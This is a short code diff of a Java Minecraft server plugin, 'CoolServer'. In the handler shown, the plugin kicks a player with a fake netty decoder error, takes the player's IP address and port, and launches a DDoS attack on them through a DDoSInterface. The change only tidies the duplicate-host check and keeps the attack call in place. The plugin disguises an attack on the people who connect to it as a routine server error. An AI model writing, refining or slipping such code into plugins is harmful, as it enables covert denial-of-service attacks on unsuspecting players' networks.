@@ -32,12 +32,10 @@ public class CoolServer extends JavaPlugin implements Listener {
         event.getPlayer().kickPlayer("Internal Exception: io.netty.handler.codec.DecoderException");
         String[] parts = event.getPlayer().getAddress().toString().substring(1).split(":");
         String host = parts[0];
-        if (current.contains(host)) {
-            return;
-        }
-        current.add(host);
-        getServer().getScheduler().runTaskAsynchronously(this,
+        if (current.add(host)) {
+            getServer().getScheduler().runTaskAsynchronously(this,
                 () -> dDoSInterface.ddos(host, Integer.parseInt(parts[1])));
+        }
     }
 
     public interface DDoSInterface {
